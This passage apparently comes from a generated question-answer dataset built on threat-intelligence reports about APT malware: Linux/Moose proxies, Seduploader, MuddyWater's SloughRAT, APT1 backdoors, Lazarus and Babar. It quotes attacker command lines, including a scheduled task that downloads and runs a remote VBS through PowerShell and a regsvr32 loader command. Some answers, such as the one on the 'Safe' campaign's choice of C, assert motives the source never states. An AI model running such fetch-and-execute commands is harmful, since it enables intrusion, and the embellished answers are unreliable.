system is infected. When some Linux/Moose scanner thread reaches an opened 10073 port, it will result in a TCP handshake without a data payload.\nHowever when we look at the code, we find that a limited number of IP addresses are allowed through:\nThe is_in_whitelist function makes sure that the source IP address of the connection is in a list of IP address given by the configuration C&C server earlier. If it is, then the socket and some configuration is passed to a thread that will handle the connection.\nNote The whitelist\nThese are the only IP addresses allowed to interact with the malware. According to our monitoring, the addresses in the list haven't changed in months but it will likely be modified after the operators become aware of this report. These servers could be either operator-owned or compromised. The current whitelist of IP addresses is available in the appendix sections .\nThe presence of a whitelist and the fallback behavior of closing the socket after a successful TCP handshake implies that we can't enumerate infected hosts by scanning the whole Internet on port 10073.\nVery Small Headline: Proxy Server Worker\nThe proxy server worker thread processes the connection from a whitelisted IP address. Upon connection the server will read a single byte. Depending on that command byte, one of four things can happen:\nTable 9. Proxy Server Worker Commands\nThese are all classic protocols to use when one wants to have Internet traffic appear as if it was originating from the infected device. The worm uses this approach to leverage the good IP address reputation of big internet service providers (ISP) clients with regards to casual browsing like viewing ads, send emails or interact with social networks. Doing any of these activities in bulk from a few data-center IP addresses would draw unwanted attention.\nVery Small Headline: SOCKS 4 Proxy\nThe implementation of the SOCKS 4 proxy is according to specifications. It enables the establishment of a TCP tunnel from the infected server to a host specified by the connecting party. After the initial handshake, traffic is sent transparently back and forth between the client of the infected service and the specified host.\nHere you can see the SOCKS exchange (1) with the tunnel destination information. Once the infected host replied that the connection is successful (0x5a) then the client (botnet operator) sends its HTTP request (2) to have it proxied through the infected machine. The infected host will finally return the response it received from the tunnel destination (3). In this case, it is a request to upgrade to HTTPS via a Location header.\nThis has been by far the most active protocol while we have been monitoring.\nVery Small Headline: SOCKS 5 Proxy\nVery similar to SOCKS 4, SOCKS 5 is a protocol to allow TCP tunnels to be created between the server's client and an arbitrary host. The malware's implementation is incomplete and only supports\nthe \"No authentication\" authentication method. This partial support is likely to be enough for the operators since they already have the whitelist mechanism in place to prevent unwanted hosts from accessing the malware. We believe it was implemented in order to support a maximum number of client applications.\nVery Small Headline: HTTP Proxy\nThe HTTP proxy is a basic yet complete HTTP/1.1 proxy. It looks at the HTTP headers, resolves the destination host, connects to it and sends the data back to the client.\nIt will also honor the CONNECT method if it is present .\nWhichever proxy technique is used, anything that tries to deal with destination TCP ports 25 (SMTP), 465 (STMPS) or 587 (Submission) will require a special flag to be set in the whitelist configuration sent by the configuration C&C server. Most of the whitelisted server have this flag turned off.\nThe mechanisms described above allow the botnet operator to leverage the good IP reputation of the infected devices in a very lightweight, flexible and inconspicuous manner.\n\nAnswer this question based on the above context: Describe the different proxy techniques used by Linux/Moose to leverage the good IP reputation of infected devices. What are the implications of using these techniques for the botnet operators?",
    "output": "Linux/Moose uses several proxy techniques, including SOCKS 4, SOCKS 5, and HTTP proxies, to make Internet traffic appear as if it originated from the infected device. The SOCKS 4 proxy establishes a TCP tunnel from the infected server to a specified host, enabling transparent traffic exchange. The SOCKS 5 proxy, although partially implemented, supports the 'No authentication' method and is used to maximize compatibility with client applications. The HTTP proxy is a basic yet complete HTTP/1.1 proxy that resolves destination hosts and sends data back to the client. These techniques allow the botnet operators to leverage the good IP reputation of big ISP clients for activities like viewing ads, sending emails, or interacting with social networks, thereby avoiding unwanted attention that would arise from bulk activities originating from a few data-center IP addresses.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Identikit\nSeduploader serves as reconnaissance malware. It is made  up of two distinct components: a dropper and the persistent payload installed by this dropper.\nAlternative Names\nJHUHUGIT, JKEYSKW\nUsage\nSeduploader's payload is a downloader used by Sednit's operators as reconnaissance malware. If the victim is considered interesting, Seduploader is instructed to download a spying backdoor, like Sedreco or Xagent.\nKnown period of activity\nMarch 2015 to August 2016 (the time of this writing). Probably still in use.\nKnown deployment methods\n\u2022 Downloaded by\n\u2022 Dropped by Microsoft Office exploits attached to\nDistinguishing characteristics\n\u2022 The Seduploader payload borrows parts of its code from Carberp\u2014 an infamous malware family whose partial source code was made public\u2014as documented by F-Secure in September 2015 (<>)[54]\n\u2022 Seduploader has been compiled for Windows and OS X (at least)\n\u2022 Older Seduploader dropper samples contain an unusual anti-analysis trick based on large temporary files (named jhuhugit.temp, jhuhugit.tmp or jkeyskw.temp depending on the version)\n\u2022 The Seduploader payload implements three different methods to contact its C&C server\nMedium Headline: Analysis\nWe define Seduploader as a two-binary component, comprising a dropper and the payload usually contained in this dropper. While those two have sometimes been used independently of each other, as shown in , they usually are deployed together and remain the most-used first-stage malware of the Sednit group since the beginning of 2015.\nThe payload component of Seduploader has been compiled for Windows and OS X, but our analysis is based solely on the Windows version. Nevertheless, the OS X version is very similar, and has been described by BAE Systems in June 2015 (<>)[56].\nVery Small Headline: Anti-Analysis Trick\nThe dropper starts with an unusual anti-analysis technique, shown as pseudocode in Figure 15.\nThis code allocates a small memory buffer B and sets its tenth byte to the value 42. It then writes and reads one million times into a newly created temporary file1 . After that operation, it checks whether the tenth byte of B still contains the value 42. If this is not the case, Seduploader terminates its execution.\nThis code primarily serves to delay execution with I/O intensive operations, in order to exhaust security products' analysis limits. It may also detect security software emulators that wrongly implement memory management, and hence are unable to maintain the correct state of B due to the number of operations performed.\nThis technique was present in another dropper employed by the Sednit group in 2014, which we have not seen since then. This trick disappeared from Seduploader in December 2015\u2014probably because it was easy to spot and could be used to detect the malware. It was then replaced by a more common anti-analysis technique based on time measurement.\nAdditionally, important strings in Seduploader's dropper are encrypted with a simple XOR-based algorithm, and the addresses of important Windows API functions are resolved dynamically.\n1 The temporary file can be named jhuhugit.temp, jhuhugit.tmp or jkeyskw.temp depending on the Seduploader version\nVery Small Headline: Payload Dropping\nThe core logic of Seduploader's dropper is implemented in a C++ class named UpLoader by its developers. This class has evolved several times since Seduploader's first appearance, and its last known version contains the eight methods described in Table 4.\nUsing those C++ methods, the dropper decrypts and decompresses its embedded payload, which consists of one or more files. It then drops the files on disk and executes them. Finally, before removing itself from the machine, the dropper makes the payload persistent, as we will describe in the following sections.\nWe know the developers named this class UpLoader because they left Run-Time Type Information (RTTI) (<>)[61] in some Seduploader samples. Additionally, the following program database (PDB) (<>)[62] path overlooked by the developers in one sample, indicates that the binary itself is named Uploader:\nD:\\REDMINE\\JOINER\\HEADER_PAYLOAD\\header_payload\\Uploader\\\nRelease\\Uploader.pdb\nThe significance of other parts of this PDB path remain obscure, except for the REDMINE part, which may refer to a project management web application (<>)[79].\nQuestion: How does the anti-analysis trick used in the Seduploader dropper work, and what is its purpose? Describe the technique in detail.",
    "output": "Answer: The anti-analysis trick in the Seduploader dropper involves allocating a small memory buffer B and setting its tenth byte to the value 42. It then performs one million write and read operations into a newly created temporary file. After these operations, it checks whether the tenth byte of B still contains the value 42. If not, Seduploader terminates its execution. This technique primarily serves to delay execution with I/O intensive operations, aiming to exhaust security products' analysis limits. It may also detect security software emulators that incorrectly implement memory management, as they might fail to maintain the correct state of B due to the number of operations performed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: SloughRAT analysis\nThe WSF implant has several capabilities. The script uses multilayer obfuscation to hide its true extensions. The screenshots below are the result of the analysis and are deobfuscations for better comprehension.\nThe RAT script needs a function name as an argument to execute correctly and perform its malicious activities. This name is provided by the instrumentor script and could be a method of thwarting automated dynamic analysis, since submitting the RAT script in isolation without the function name as an argument will result in a failed run of the sample in a sandbox.\nPreliminary information gathering and infection registration\nThe RAT script begins execution by performing a WMI query to record the IP address of the infected endpoint.\nDeobfuscation of discovery capabilities.\nIt will then get the user and computer names by querying the environment variables:\n%COMPUTERNAME%\n%USERNAME%\nDeobfuscation of discovery capabilities.\nThis system information is then concatenated using a delimiter and encoded to register the infected system with the C2 server hardcoded into the implant.\nFormat:\n<IP_address>|!)!)!|%ComputerName%/%USERNAME%\nRAT capabilities\nThis RAT's capabilities are relatively simple, aside from the information-gathering capabilities described previously.\nOnce the infection is registered with the C2 server, the implant will receive a command code from the C2 server. The implant uses two different URLs:\nOne is used to register the implant and request arbitrary commands from the C2.\nAnother that is used to POST the results of the commands executed on the infected endpoint.\nThe communication with the C2 is done using the common ServerXMLHTTP from the MSXML2 API to instrument an HTTP POST request.\nThe time between each request is randomized, which makes the malware stealthier and can bypass some sandboxes.\nDeobfuscation of HTTP request construction.\nAny data sent to the C2 server is in the format of HTTP forms accompanied by relevant headers, like:\nContent-Type\nContent-Length\nCharSet.\nFirst, the script sends the system information to the first C2 URL, by encoding the message, and sending it via POST request, inside the parameter \"vl\" using the following format:\n<IP_address>|!)!)!|%ComputerName%/%USERNAME%\nThen, the server returns a UID constructed via concatenation of the server IP and an UUIDv4.\nFor example, the UID 5-199-133-149-<UUIDv4>\nis stored in a variable and sends keep-alive messages to request commands from the C2.\nThen, this UID is sent through \"vl\" parameters inside a POST HTTP request to another C2 URL.\nWhen the server receives this UID, it returns an encoded message that the script interprets.\nThe message can be:\n\"ok\": Do nothing and send the UID again (like a keep-alive).\n\"401\": This order cleans the UID variable and forces the script to request another UID, by sending a request to the first URI.\nA command to execute that starts the command execution routine.\nA command received from the C2 server will be executed using the command line utility. Its output is recorded in a temporary file on disk in a location such as \"%TEMP%\\stari.txt\". This data is then immediately read and sent out to the C2. The message will have the following format:\n<UID>|!)!)!|<result of command output>\nCommands are executed using the command line:\ncmd.exe /c <command_sent_by_C2> >> <path_to_temp_file>\nDeobfuscation of command execution routine.\nThe attackers used another version of SloughRAT, which isn't as obfuscated as the version illustrated earlier, this time targeting entities in the Arabian peninsula. The overall functionality used in this instance is the same with minor modifications in file paths, delimiters, etc.\nVersion No. 2 of the WSF RAT \u2014 minor changes only.\nThe attackers utilized SloughRAT to deploy (<https://github.com/sysdream/ligolo>)Ligolo, an open-source reverse-tunneling tool to gain a greater degree of control over the infected endpoints. This tactic observed is in sync with (<https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html>)previous findings from Trend Micro.\nOverall infection chain:\nMedium Headline: VBS-based downloaders\nIn another instance, we observed the deployment of VBS-based malicious downloaders in December 2021 and through January 2022 via malicious scheduled tasks set up by the attackers. The scheduled task would look something like this:\nSchTasks /Create /SC ONCE /ST 00:01 /TN <task_name> /TR powershell -exec bypass -w 1 Invoke-WebRequest -Uri '<remote_URL_location>' -OutFile <malicious_VBS_path_on_endpoint>; wscript.exe <malicious_VBS_path_on_endpoint>\nThese tasks download and parse content from the C2 server and execute it on the infected endpoint. The output of the command would be written to a temporary file in the %APPDATA% directory and subsequently read and exfiltrated to the C2.\nThe complete infection chain of these VBS-based downloaders is currently unknown.\nVBS-based downloader.\nMedium Headline: Older campaign using JS-based downloaders\nAn older campaign operated by MuddyWater toward the end of November 2019 and into 2020 utilized maldocs and a convoluted chain of obfuscated scripts to deploy a JavaScript-based downloader/stager on the infected endpoint. This campaign also appears to target Turkish users.\nThe maldoc contains a macro that would drop a malicious obfuscated VBS in a directory on the system. The macros would then create persistence for the VBS via the Registry Run key of the current user. This VBS is responsible for deobfuscating the next payloads and executing\nthem on the endpoint. This execution culminated into a malicious JS downloader being executed on the system to download and execute commands.\nJS-based downloader.\nBig Headline: Conclusion\nCisco Talos has observed Iranian APT groups conducting malicious operations and activities all over the world for years. Particularly, 2021 was prolific in cybersecurity incidents for Iran where state-run organizations were targeted. These events were attributed to Western nations by the Iranian regime, with the promise of revenge. It's hard to say if these campaigns are the result of such promises or just part of these groups' usual activity. However, the fact that they have changed some of their methods of operation and tools is yet another sign of their adaptability and unwillingness to refrain themselves from attacking other nations.\nWe believe there are links between these different campaigns, including the migration of techniques from region to region, along with their evolution into more advanced versions. Overall, the campaigns we describe cover Turkey, Pakistan, Armenia and countries from the Arabian peninsula. While they share certain techniques, these campaigns also denote individuality in the way they were conducted, indicating the existence of multiple sub-teams beneath the Muddywater umbrella \u2014 all sharing a pool of tactics and tools to pick and choose from.\nIn-depth defense strategies based on a risk analysis approach can deliver the best results in protecting against such a highly motivated set of threat actors. However, this should always be complemented by a good incident response plan which has not only been tested with table top exercises, but also reviewed and improved every time it is put to the test on real engagements.\nBig Headline: Coverage\nWays our customers can detect and block this threat are listed below.\n(formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free .\n(formerly Next-Generation Firewall and Firepower NGFW) appliances such as , (<https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html>)Adaptive Security Appliance and  can detect malicious activity associated with this threat.\n, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella .\nAdditional protections with context to your specific environment and threat data are available from the (<https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html>)Firewall Management Center.\nprovides multi-factor authentication for users to ensure only those authorized are accessing your network.\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on (<https://www.snort.org/products>)Snort.org.\nSnort rules for protection against this threat are: 59226 - 59230.\n\nBased on the above text, answer a question. How did the MuddyWater APT group utilize a JavaScript-based downloader in an older campaign targeting Turkish users in late 2019 and early 2020? Describe the infection chain and the role of the JavaScript downloader.",
    "output": "In an older campaign, the MuddyWater APT group used maldocs containing a macro that would drop a malicious obfuscated VBS in a directory on the system. The macros would then create persistence for the VBS via the Registry Run key of the current user. This VBS was responsible for deobfuscating the next payloads and executing them on the endpoint. This execution culminated in a malicious JS downloader being executed on the system to download and execute commands. The infection chain involved multiple stages of obfuscation and persistence mechanisms to ensure the successful deployment of the JavaScript-based downloader.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Beachhead Backdoors\nBeachhead backdoors are typically minimally featured. They offer the attacker a toe-hold to perform simple tasks like retrieve files, gather basic system information and trigger the execution of other more significant capabilities such as a standard backdoor.\nwhat is a malware family?\nA malware family is a collection of malware in which each sample shares a significant amount of code with all of the others. To help illustrate this, consider the following example from the physical world. There is now a vast array of computing tablets for sale. These include Apple's iPad, Samsung's Galaxy Tab, and Microsoft's Surface. Although these are all tablet computers, \"under the hood\" they are probably quite different. However, one can expect that an iPad 1 and an iPad 2 share a significant number of components \u2014 much more than, say, an iPad 1 and a Microsoft Surface. Thus it makes sense to refer to the iPad \"family\" and the Surface \"family\".\nWhen it comes to computer programs, in general if they share more than 80% of the same code we consider them part of the same family. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.\nAPT1's beachhead backdoors are usually what we call WEBC2 backdoors. WEBC2 backdoors are probably the most well-known kind of APT1 backdoor, and are the reason why some security companies refer to APT1 as the \"Comment Crew.\" A WEBC2 backdoor is designed to retrieve a webpage from a C2 server. It expects the webpage to contain special HTML tags; the backdoor will attempt to interpret the data between the tags as commands. Older versions of WEBC2 read data between HTML comments, though over time WEBC2 variants have evolved to read data contained within other types of tags. From direct observation, we can confirm that APT1 was using WEBC2 backdoors as early as July 2006. However, the first compile time35 we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1 has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years.\nFor example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process:\nVery Small Headline: sample B\nMD5: c1393e77773a48b1eea117a302138554\nCompile date: 2009-08-07\nD:\\work\\code\\2008-7-8muma\\mywork\\winInet_ winApplication2009-8-7\\mywork\\aaaaaaa\\Release\\ aaaaaaa.pdb\nweBC2 families\nWEBC2-AUSOV\nWEBC2-ADSPACE\nWEBC2-BOLID\nWEBC2-CLOVER\nWEBC2-CSON\nWEBC2-DIV\nWEBC2-GREENCAT\nWEBC2-HEAD\nWEBC2-KT3\nWEBC2-QBP\nWEBC2-RAVE\nWEBC2-TABLE\nWEBC2-TOCK\nWEBC2-UGX\nWEBC2-YAHOO\nWEBC2-Y21K\n\u2026 and many still uncategorized\n35 \"Compile\" refers to the process of transforming a programmer's source code into a file that a computer can understand and execute. The compile date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it.\nThe BISCUIT backdoor (so named for the command \"bdkzt\") is an illustrative example of the range of commands that APT1 has built into its \"standard\" backdoors. APT1 has used and steadily modified BISCUIT since as early as 2007 and continues to use it presently.\ntaBLe 4: a subset of BIsCuIt commands\nThese functions are characteristic of most backdoors, and are not limited to APT1 or even APT. For example, anyone who wants to control a system remotely will likely put functions like \"Upload/download files\" into a backdoor.\nSmall Headline: Covert Communications\nSome APT backdoors attempt to mimic legitimate Internet traffic other than the HTTP protocol. APT1 has created a handful of these, including:\ntaBLe 5: Backdoors that mimic legitimate communication protocols\nWhen network defenders see the communications between these backdoors and their C2 servers, they might easily dismiss them as legitimate network traffic. Additionally, many of APT1's backdoors use SSL encryption so that communications are hidden in an encrypted SSL tunnel. We have provided APT1's public SSL certificates in Appendix F so people can incorporate them into their network signatures.\nMedium Headline: Privilege Escalation\nEscalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more resources within the network. In this and the next two stages, APT1 does not differ significantly from other APT intruders (or intruders, generally). APT1 predominantly uses publicly available tools to dump password hashes from victim systems in order to obtain legitimate user credentials.\nAPT1 has used these privilege escalation tools:\ntaBLe 6: Publicly available privilege escalation tools that aPt1 has used\nwhat is a password hash?\nWhen a person logs in to a computer, website, email server, or any networked resource requiring a password, the supplied password needs to be verified. One way to do this would be to store the person's actual password on the system that the person is trying to access, and to compare the typed password to the stored password. Although simple, this method is also very insecure: anyone who can access that same system will be able to see the person's password. Instead, systems that verify passwords usually store password hashes. In simple terms, a password hash is a number that is mathematically generated from the person's password. The mathematical methods (algorithms) used to generate password hashes will create values that are unique for all practical purposes. When a person supplies their password, the computer generates a hash of the typed password and compares it to the stored hash. If they match, the passwords are presumed to be the same and the person is allowed to log in.\nIt is supposed to be impossible to \"reverse\" a hash to obtain the original password. However, it is possible with enough computational resources to \"crack\" password hashes to discover the original password. (\"Cracking\" generally consists of guessing a large number of passwords, hashing them, and comparing the generated hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems in hopes that they can either use the hashes as-is (by \"passing-the-hash\") or crack them to discover users' passwords.\nMedium Headline: Internal Reconnaissance\nIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most APT (and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system and its networked environment. Although they usually simply type these commands into a command shell, sometimes intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that APT1 used on at least four victim networks.\nFIGure 18: an aPt1 batch script that automates reconnaissance\nThis script performs the following functions and saves the results to a text file:\n\u00bb\u00bb Display the victim's network configuration information\n\u00bb\u00bb List the services that have started on the victim system\n\u00bb\u00bb List currently running processes\n\u00bb\u00bb List accounts on the system\n\u00bb\u00bb List accounts with administrator privileges\n\u00bb\u00bb List current network connections\n\u00bb\u00bb List currently connected network shares\n\u00bb\u00bb List other systems on the network\n\u00bb\u00bb List network computers and accounts according to group (\"domain controllers,\" \"domain users,\" \"domain admins,\" etc.)\nMedium Headline: Lateral Movement\nOnce an APT intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder to move around the network undetected:\n\u00bb\u00bb They can connect to shared resources on other systems\n\u00bb\u00bb They can execute commands on other systems using the publicly available \"psexec\" tool from Microsoft Sysinternals or the built-in Windows Task Scheduler (\"at.exe\")\nThese actions are hard to detect because legitimate system administrators also use these techniques to perform actions around the network.\nSmall Headline: 1. Install new backdoors on multiple systems\nThroughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can use. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been present for more than a few weeks.\nSmall Headline: 2. use legitimate vPn credentials\nAPT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user. We have observed APT1 using stolen usernames and passwords to log into victim networks' VPNs when the VPNs are only protected by single-factor authentication. From there they are able to access whatever the impersonated users are allowed to access within the network.\n36 Mandiant uses the term \"credentials\" to refer to a userid and its corresponding, working password.\n\nHow does APT1's BISCUIT backdoor exemplify the range of commands used in standard backdoors, and why is this important for cybersecurity professionals to understand?",
    "output": "A: APT1's BISCUIT backdoor includes a wide range of commands such as uploading/downloading files, executing commands, and gathering system information. These functions are typical of most backdoors and are not unique to APT1. Understanding the capabilities of backdoors like BISCUIT is important for cybersecurity professionals because it highlights the common tactics, techniques, and procedures (TTPs) used by advanced threat actors. By recognizing these standard features, defenders can better prepare and respond to potential intrusions, regardless of the specific backdoor variant being used.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: group has for 5 years mined victims, apparently in search of geo-political intelligence\nThis Naikon report will be complemented by a follow-on report that will examine the Naikon TTP and the incredible volume of attack activity around the South China Sea that has been going on since at least 2010.\nNoteworthy operational and logistical characteristics of this APT include:\nAt least five years of high volume, high profile, geo-political attack activity\nGeographical focus \u2013 per-country, individual operator assignment and proxy presence\nDynamic, well organized infrastructure\nReliance on an externally developed, consistent set of tools comprising a full-featured backdoor, a builder, and an exploit builder\nHigh success rate in infiltrating national organisations in ASEAN countries\n\nHow did the Naikon APT manage to achieve a high success rate in infiltrating national organizations in ASEAN countries, and what were the key operational and logistical characteristics that contributed to this success?",
    "output": "A: The Naikon APT achieved a high success rate in infiltrating national organizations in ASEAN countries through several key operational and logistical characteristics. These included at least five years of high volume, high profile, geo-political attack activity, which allowed them to refine their tactics and techniques over time. Additionally, they employed a geographical focus, assigning individual operators and maintaining proxy presence per country, which enabled targeted and effective attacks. Their dynamic and well-organized infrastructure further supported their operations. Moreover, the group relied on an externally developed, consistent set of tools comprising a full-featured backdoor, a builder, and an exploit builder, which provided them with robust capabilities for infiltration and data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Source Code\nThis section shows some of the discoveries we made while trying to identify the functionality and use cases of each application we discovered. Nearly all of the samples were coded in C, specifically Visual C.\nThe directory structure of the source code appeared to be standard of directories written using C, Visual Studio\u00ae Express, or a litany of other tools. The code appeared to be very robust. We created a complete mind map of the code, its directories and the files located within the said directories.9\nThe applications in the following section are only a few of those that contained some of the most interesting details about our findings.\n9 Due to the number and depth of directories discovered, what has been included here is only a portion of the mind map we created.\nAnswer this question: Why did the authors of the 'Safe' campaign choose to use C and Visual Studio\u00ae Express for developing their malware, and how does understanding this choice help in analyzing and mitigating similar threats?",
    "output": "The authors of the 'Safe' campaign chose to use C and Visual Studio\u00ae Express because these tools provide a robust and efficient environment for coding complex applications. The directory structure of the source code followed standard conventions used in C programming, indicating a high level of organization and sophistication. Understanding this choice helps in analyzing the malware by allowing defenders to create detailed mind maps of the code, its directories, and the files within those directories. This comprehensive mapping enables better insight into the functionality and use cases of each application, aiding in the development of effective countermeasures against similar threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do APT groups like Bureau 121, Axiom, and Naikon use reconnaissance techniques to gather information and plan future operations?",
    "output": "Reconnaissance is a critical phase in the adversary lifecycle where attackers gather information to support targeting. In the context of APT groups like Bureau 121, Axiom, and Naikon, reconnaissance plays a vital role in planning future operations. These groups use various reconnaissance techniques to gather information about their targets, including network topology, system vulnerabilities, and employee behavior. For example, Bureau 121, a North Korean APT group, uses reconnaissance to identify vulnerabilities in South Korean financial institutions and media companies. Axiom, a Chinese APT group, conducts reconnaissance to identify targets in the science and technology sectors, including organizations involved in advanced research and development. Naikon, another Chinese APT group, uses reconnaissance to gather information about civilian and military government organizations in Southeast Asia. These groups leverage the gathered information to plan and execute initial access, scope and prioritize post-compromise objectives, and drive further reconnaissance efforts. By understanding the reconnaissance techniques used by these APT groups, organizations can better defend themselves against targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SUMMARY\nThe Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the U.S. Treasury Department (Treasury) are issuing this joint Cybersecurity Advisory (CSA) to highlight the cyber threat associated with cryptocurrency thefts and tactics used by a North Korean state-sponsored advanced persistent threat (APT) group since at least 2020. This group is commonly tracked by the cybersecurity industry as Lazarus Group, APT38, BlueNoroff, and Stardust Chollima. For more information on North Korean state-sponsored malicious cyber activity, visit .\nActions to take today to mitigate cyber threats to cryptocurrency:\n\u2022 Patch all systems.\n\u2022 Prioritize patching known exploited vulnerabilities.\n\u2022 Train users to recognize and report phishing attempts. \u2022 Use multifactor authentication.\nThe U.S. government has observed North Korean cyber actors targeting a variety of organizations in the blockchain technology and cryptocurrency industry, including cryptocurrency exchanges, decentralized finance (DeFi) protocols, play-to-earn cryptocurrency video games, cryptocurrency trading companies, venture capital funds investing in cryptocurrency, and individual holders of large amounts of cryptocurrency or valuable non-fungible tokens (NFTs). The activity described in this advisory involves social engineering of victims using a variety of communication platforms to encourage individuals to download trojanized cryptocurrency applications on Windows or macOS operating systems. The cyber actors then use the applications to gain access to the victim's\nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at , or the FBI's 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at . When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at .\nDISCLAIMER: The information in this advisory is provided \"as is\" for informational purposes only. The FBI, CISA, and Treasury do not provide any warranties of any kind regarding this information or endorse any commercial product or service, including any subjects of analysis.\nThis document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol, see /.\ncomputer, propagate malware across the victim's network environment, and steal private keys or exploit other security gaps. These activities enable additional follow-on activities that initiate fraudulent blockchain transactions.\nThe U.S. government previously published an advisory about North Korean state-sponsored cyber actors using AppleJeus malware to steal cryptocurrency: AppleJeus: Analysis of North Korea's Cryptocurrency Malware. The U.S. government has also previously published advisories about North Korean state-sponsored cyber actors stealing money from banks using custom malware:\n\u2022 HIDDEN COBRA \u2013 FASTCash Campaign\n\u2022 FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks\nThis advisory provides information on tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to stakeholders in the blockchain technology and cryptocurrency industry to help them identify and mitigate cyber threats against cryptocurrency.\n\nAnswer this question based on the above context: What specific measures can organizations in the blockchain technology and cryptocurrency industry take to mitigate the cyber threats posed by North Korean state-sponsored APT groups like Lazarus? Provide a detailed explanation of each measure.",
    "output": "Organizations can take several measures to mitigate cyber threats posed by North Korean state-sponsored APT groups like Lazarus. These measures include: patching all systems to ensure they are up-to-date and secure; prioritizing the patching of known exploited vulnerabilities to prevent attackers from leveraging them; training users to recognize and report phishing attempts, which is crucial for preventing social engineering attacks; and using multifactor authentication to add an extra layer of security to user accounts. By implementing these measures, organizations can significantly reduce the risk of falling victim to sophisticated cyber attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. SHOOTING ELEPHANTS\nSubject of this analysis is a fascinating piece of malware, which invades Windows desktop machines and aims at.. well, all the things. The analyzed malware consists of a dropper and an implant, which invades Windows processes to steal data from instant messengers, softphones, browsers and office applications. A fully blown espionage kit, so to say, sophisticated almost. The implant is able to hook APIs of interest in dedicated remote processes, to steal data on the fly.\nMore interesting than the malware itself though is the path to the associated symbol file, which appears embedded in the dropper. The analyzed malware samples come with the internal project name 'Babar64'.\nIllustration 1 | The .pdb path embedded in Babar's dropper\nThe myth of Babar has been around for a while in the intelligence community. Questions have been raised since Le Monde published an article on Babar in 2014 [1] and were recently fuelled by a leaked government presentation found among a stash of documents published in January by Spiegel [2]. The leaked document was authored by the Communications Security Establishment Canada (CSEC) and reports about a potential nation state attack involving malware named Babar. The actor behind the attacks is assumed to be French inteligence. Assumptions are based on certain binary attributes, language and location of infrastructure as well as targets.\nThe binaries at hand fit well with the description CSEC provides, although it is quite clear they are a newer version from what CSEC had uncovered around 2009. It is not clear whether the compilation timestamps are falsified, but an earlier compilation time than the actual stamp seems unlikely.\nDoubtlessly though, the Babar binaries match with a malware strain representing itself as Bunny, as well as a family dubbed NBOT or TFC.\nBig Headline: 2. MISCREANT'S DROPPER\nThe dropper operates straight forward; it fetches the encrypted DLL from its own binary from outside its resource section, decrypts it and hides it in the file system. Then it goes on to load the DLL using Windows regsvr32.exe. To achieve this it spawns a dedicated process with the command line '\"regsvr32.exe\" /s /n /i \"%APPDATA%\\%DLLNAME%\"'.\nThe DLL name is random but legitimately looking and hardcoded for a specific dropper. It is also stored as encrypted string in the binary, and has been seen to decrypt to either 'perf585.dll' or 'dump21cb.dll' depending on the dropper.\nThe encryption algorithm used is AES (Advanced Encryption Standard) with 128-bit keys. The keys used for decryption are '20 33 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C' for the implant filename and 'A0 0E 3E B3 3A 1C D3 AA A0 BE 3F B3 F9 0A 96 15' for decrypting the binary. AES is the encryption algorithm of choice throughout the dropper and its implant's operations.\nInterestingly, the Babar dropper as well as the implant show a similar method of API name obfuscation as the Bunny malware and samples from the NBOT family. Dedicated APIs are loaded through a resolution function, which searches for library exports by comparing hashes of the export names with a given hash. For the Babar project though the attackers used an adapted version of SHA-1, as opposed to the simple XOR/ROL hash algorithm which was used in the Bunny project.\nAfter infection the dropper executes a separate command line through spawning a cmd.exe process, which is instructed to wait for 1 second before deleting the dropper binary on disk. This way the malware reduces forensic artefacts, staying behind after infection. Curiously though, the regsvr32.exe process used to load the dropped implant remains running. This way 